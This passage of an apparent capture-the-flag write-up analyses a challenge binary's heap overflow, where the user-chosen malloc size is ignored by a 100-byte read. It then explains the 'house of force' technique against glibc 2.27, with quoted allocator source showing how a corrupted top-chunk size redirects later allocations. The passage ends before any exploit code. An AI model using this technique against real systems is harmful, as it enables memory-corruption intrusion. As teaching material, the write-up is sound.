</span></span><span style="display:flex;"><span>        sVar3 <span style="color:#555">=</span> strcspn(score,<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>        score[sVar3] <span style="color:#555">=</span> <span style="color:#c30">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>        size <span style="color:#555">=</span> strtol(score,<span style="color:#555">&amp;</span>pty,<span style="color:#f60">10</span>);
</span></span><span style="display:flex;"><span>        ptr <span style="color:#555">=</span> (<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">*</span>)malloc(size);
</span></span><span style="display:flex;"><span>        chunk <span style="color:#555">=</span> ptr;
</span></span><span style="display:flex;"><span>        printf(<span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Who is this Hall of Famer &gt; &#34;</span>);
</span></span><span style="display:flex;"><span>        fflush(stdout);
</span></span><span style="display:flex;"><span>        fgets(word,<span style="color:#f60">100</span>,stdin);
</span></span><span style="display:flex;"><span>        fflush(stdin);
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)chunk <span style="color:#555">=</span> word._0_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">=</span> word._8_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x10</span>) <span style="color:#555">=</span> word._16_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x18</span>) <span style="color:#555">=</span> word._24_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">=</span> word._32_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x28</span>) <span style="color:#555">=</span> word._40_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x30</span>) <span style="color:#555">=</span> word._48_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x38</span>) <span style="color:#555">=</span> word._56_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x40</span>) <span style="color:#555">=</span> word._64_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x48</span>) <span style="color:#555">=</span> word._72_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x50</span>) <span style="color:#555">=</span> word._80_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x58</span>) <span style="color:#555">=</span> word._88_8_;
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined4 <span style="color:#555">*</span>)(chunk <span style="color:#555">+</span> <span style="color:#f60">0x60</span>) <span style="color:#555">=</span> word._96_4_;
</span></span><span style="display:flex;"><span>        heap_pointer <span style="color:#555">=</span> ptr;
</span></span><span style="display:flex;"><span>        counter <span style="color:#555">=</span> counter <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that we can basically control the malloc size (via <code>score</code>). And the bug is during getting the input for the malloc&rsquo;s content. The input size is always 100 no matter what our malloc&rsquo;s chunk size. This means that there is heap-overflow bug on the code.</p>
<p>However, notice that there isn&rsquo;t any <code>free</code> feature, which mean we can only do <code>malloc</code>, and the previous chunk will be forgotten.</p>
<h3 id="exploitation-plan-1">Exploitation Plan <a href="#exploitation-plan-1" class="anchor">#</a></h3>
<p>So far, what we have gathered:</p>
<ul>
<li>We know the heap address and the libc base address</li>
<li>We can control the malloc size</li>
<li>There is heap-overflow bug (with constraint that the malloc chunk size is less than 100)</li>
<li>There isn&rsquo;t <code>free</code> feature</li>
<li>The libc file is glibc 2.27</li>
</ul>
<p>We can use <em>house of force</em> attack to solve this challenge.</p>
<p>House of force is an attack, which is done by overflowing the heap&rsquo;s wildernerss/top_chunk&rsquo;s size into a large number, so that we can forge the malloc chunk address to address that we want. Refering to the <a href="http://phrack.org/issues/66/10.html" target="_blank" rel="noopener">phrack</a> article, it requires three conditions:</p>
<ol>
<li>One overflow in a chunk that allows to overwrite the Wilderness.</li>
<li>A call to &ldquo;malloc()&rdquo; with size field defined by designer.</li>
<li>Another call to &ldquo;malloc()&rdquo; where data can be handled by designer.</li>
</ol>
<p>To give some context, suppose that in the current heap, we have one chunk with size 0x20, usually the layout of heap is like below</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>| prev_size chunk |
</span></span><span style="display:flex;"><span>|-----------------| &lt;- 0x8 byte
</span></span><span style="display:flex;"><span>|   size chunk    |
</span></span><span style="display:flex;"><span>|-----------------| &lt;- 0x8 byte
</span></span><span style="display:flex;"><span>|      data       |
</span></span><span style="display:flex;"><span>|                 |
</span></span><span style="display:flex;"><span>|-----------------| &lt;- 0x10 byte
</span></span><span style="display:flex;"><span>|prev_sz top_chunk|
</span></span><span style="display:flex;"><span>|-----------------| &lt;- 0x8 byte
</span></span><span style="display:flex;"><span>| size top_chunk  |
</span></span><span style="display:flex;"><span>|-----------------| &lt;- 0x8 byte
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, on the given binary, if we allocate a size (<code>score</code>) less than 100, and we can allocate 100 bytes, that means we can overwrite the top_chunk size, which mean we have fulfilled the first condition.</p>
<p>And then, because we can call <code>malloc</code> as much as we can, and we can control the size, that means the second and third requirements are fulfilled also.</p>
<p>To understand better the idea behind it, this attack want to abuse this LOC in the <code>malloc.c</code> implementation inside <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c" target="_blank" rel="noopener">glibc 2.27</a> method <code>_int_malloc</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#99f">use_top</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#09f;font-style:italic">/*
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         If large enough, split off the chunk bordering the end of memory
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         (held in av-&gt;top). Note that this is in accord with the best-fit
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         search rule.  In effect, av-&gt;top is treated as larger (and thus
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         less well fitting) than any other available chunk since it can
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         be extended to be as large as necessary (up to system
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         limitations).
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         We require that av-&gt;top always exists (i.e., has size &gt;=
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         MINSIZE) after initialization, so if it would otherwise be
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         exhausted by current request, it is replenished. (The main
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         reason for ensuring it exists is that we may need MINSIZE space
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">         to put in fenceposts in sysmalloc.)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">       */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      victim <span style="color:#555">=</span> av<span style="color:#555">-&gt;</span>top;
</span></span><span style="display:flex;"><span>      size <span style="color:#555">=</span> chunksize (victim);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> ((<span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">long</span>) (size) <span style="color:#555">&gt;=</span> (<span style="color:#078;font-weight:bold">unsigned</span> <span style="color:#078;font-weight:bold">long</span>) (nb <span style="color:#555">+</span> MINSIZE))
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          remainder_size <span style="color:#555">=</span> size <span style="color:#555">-</span> nb;
</span></span><span style="display:flex;"><span>          remainder <span style="color:#555">=</span> chunk_at_offset (victim, nb);
</span></span><span style="display:flex;"><span>          av<span style="color:#555">-&gt;</span>top <span style="color:#555">=</span> remainder;
</span></span><span style="display:flex;"><span>          set_head (victim, nb <span style="color:#555">|</span> PREV_INUSE <span style="color:#555">|</span>
</span></span><span style="display:flex;"><span>                    (av <span style="color:#555">!=</span> <span style="color:#555">&amp;</span>main_arena <span style="color:#555">?</span> <span style="color:#99f">NON_MAIN_ARENA</span> : <span style="color:#f60">0</span>));
</span></span><span style="display:flex;"><span>          set_head (remainder, remainder_size <span style="color:#555">|</span> PREV_INUSE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          check_malloced_chunk (av, victim, nb);
</span></span><span style="display:flex;"><span>          <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>p <span style="color:#555">=</span> chunk2mem (victim);
</span></span><span style="display:flex;"><span>          alloc_perturb (p, bytes);
</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">return</span> p;
</span></span><span style="display:flex;"><span>        }
</span></span></code></pre></td></tr></table>
</div>
</div><p>Reading through the <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c" target="_blank" rel="noopener">source code of glibc malloc implementation</a>, when we call <code>malloc(size)</code>, it will try to check whether there is any entries in the heap bin first. If not, then it will try to use the <code>top_chunk</code>, which basically goes to the above code.</p>
<p>And then, the reason why we overwrite the chunk size with a large value (E.g. -1, which is <code>0xFFFFFFFFFFFFFFFF</code>) is to ensure that if we do <code>malloc(large_size)</code>, it will be guaranteed that the <code>malloc</code> will goes to the above LOC (it fulfilled this condition <code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>), so that it won&rsquo;t call <code>mmap</code> via <code>sysmalloc</code> (You can read the full source code in <a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3520" target="_blank" rel="noopener">here</a>).</p>
<p>Assume that we have overwite the top chunk size with <code>0xFFFFFFFFFFFFFFFF</code> with the heap overflow that we found before.
Let&rsquo;s move to the logic inside the conditional block to understand why we can pivot the malloc chunk to our desired address.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>          remainder_size <span style="color:#555">=</span> size <span style="color:#555">-</span> nb;
</span></span><span style="display:flex;"><span>          remainder <span style="color:#555">=</span> chunk_at_offset (victim, nb);
</span></span><span style="display:flex;"><span>          av<span style="color:#555">-&gt;</span>top <span style="color:#555">=</span> remainder;
</span></span></code></pre></td></tr></table>
</div>
</div><p>What is <code>nb</code>? Diving through the source code,</p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc-internal.h#L59" target="_blank" rel="noopener">malloc-internal.h</a></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#ifndef INTERNAL_SIZE_T
</span></span></span><span style="display:flex;"><span><span style="color:#099"># define INTERNAL_SIZE_T size_t
</span></span></span><span style="display:flex;"><span><span style="color:#099">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* The corresponding word size.  */</span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><a href="https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L1229" target="_blank" rel="noopener">malloc.c</a></p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#define request2size(req)                                         \
</span></span></span><span style="display:flex;"><span><span style="color:#099">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
</span></span></span><span style="display:flex;"><span><span style="color:#099">   MINSIZE :                                                      \
</span></span></span><span style="display:flex;"><span><span style="color:#099">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/*  Same, except also perform argument check */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#099">#define checked_request2size(req, sz)                             \
</span></span></span><span style="display:flex;"><span><span style="color:#099">  if (REQUEST_OUT_OF_RANGE (req)) {					      \
</span></span></span><span style="display:flex;"><span><span style="color:#099">      __set_errno (ENOMEM);						      \
</span></span></span><span style="display:flex;"><span><span style="color:#099">      return 0;								      \
</span></span></span><span style="display:flex;"><span><span style="color:#099">    }									      \
</span></span></span><span style="display:flex;"><span><span style="color:#099">  (sz) = request2size (req);
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>_int_malloc (mstate av, size_t bytes)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    checked_request2size (bytes, nb);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Okay, so <code>nb = input_size + 8</code>. Basically, what it does is</p>
<ul>
<li>Calculate new <code>top_chunk</code> size, which is <code>curr_size - (input_size + 8)</code></li>
<li>Calculate new <code>top_chunk</code> address, which is <code>top_chunk + (input_size + 8)</code></li>
<li>Set is as the new <code>top_chunk</code> by assigning it to <code>av-&gt;top</code></li>
</ul>
<p>Let&rsquo;s check the next code</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>          set_head (victim, nb <span style="color:#555">|</span> PREV_INUSE <span style="color:#555">|</span>
</span></span><span style="display:flex;"><span>                    (av <span style="color:#555">!=</span> <span style="color:#555">&amp;</span>main_arena <span style="color:#555">?</span> <span style="color:#99f">NON_MAIN_ARENA</span> : <span style="color:#f60">0</span>));
</span></span><span style="display:flex;"><span>          set_head (remainder, remainder_size <span style="color:#555">|</span> PREV_INUSE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>          check_malloced_chunk (av, victim, nb);
</span></span><span style="display:flex;"><span>          <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>p <span style="color:#555">=</span> chunk2mem (victim);
</span></span><span style="display:flex;"><span>          alloc_perturb (p, bytes);
</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">return</span> p;
</span></span></code></pre></td></tr></table>
</div>
</div><p>What it does is basically set the old <code>top_chunk</code> (<code>victim</code>) as the returned <code>malloc</code> chunk and also update the new <code>top_chunk</code> size by subtracting it.</p>
<p>Due to the previous overflow, we can calculate the correct malloc size to pivot the top_chunk to our desired address. Suppose that our desired address is <code>x</code>, then:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
